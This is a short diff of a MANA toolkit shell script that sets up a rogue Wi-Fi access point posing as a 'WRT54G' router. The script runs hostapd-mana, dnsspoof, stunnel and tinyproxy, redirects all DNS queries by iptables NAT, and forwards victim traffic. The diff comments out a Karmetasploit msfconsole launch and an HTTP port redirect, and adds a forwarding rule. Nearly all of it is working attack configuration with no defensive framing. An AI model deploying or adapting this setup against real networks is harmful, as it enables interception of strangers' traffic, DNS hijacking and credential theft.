@@ -3,12 +3,12 @@
 phy=wlan0
 conf=/etc/mana-toolkit/hostapd-mana.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
-
+set -x
 hostname WRT54G
 echo hostname WRT54G
 sleep 2
 
-service network-manager stop
+#service network-manager stop
 rfkill unblock wlan
 
 ifconfig $phy down
@@ -27,7 +27,7 @@ dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
 service apache2 start
 stunnel4 /etc/mana-toolkit/stunnel.conf
 tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
-msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
+#msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
@@ -36,7 +36,8 @@ iptables --policy OUTPUT ACCEPT
 iptables -F
 iptables -t nat -F
 iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
-
+iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
+#iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 echo "Hit enter to kill me"
 read
 pkill hostapd
